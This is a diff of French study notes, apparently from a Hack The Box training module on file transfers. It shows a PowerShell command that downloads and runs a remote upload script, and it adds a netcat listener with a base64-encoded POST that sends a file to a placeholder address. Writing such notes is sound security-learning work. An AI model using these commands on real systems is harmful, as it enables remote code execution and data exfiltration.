@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:03:44.780Z
+date: 2025-03-29T13:06:53.899Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -245,4 +245,18 @@ Il est ensuite possible d'utiliser les cmdlets PowerShell ou de passer par un sc
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 Invoke-FileUpload -Uri http://<adresse>:<portr>/upload -File <fichier>
 ```
+
+Un autre moyen d'envoyer des fichiers est de passer par une requète POST avec le fichier encodé, dans le body de la requète, et d'avoir un listener qui attends la réquète.
+
+Écouter sur le port avec Netcat:
+```
+nc -lvnp <port>
+```
+
+Effectuer la requète POST avec le fichier encodé dans le body:
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<fichier>' -Encoding Byte))
+Invoke-WebRequest -Uri http://<adresse>:<port>/ -Method POST -Body $b64
+```
+
 
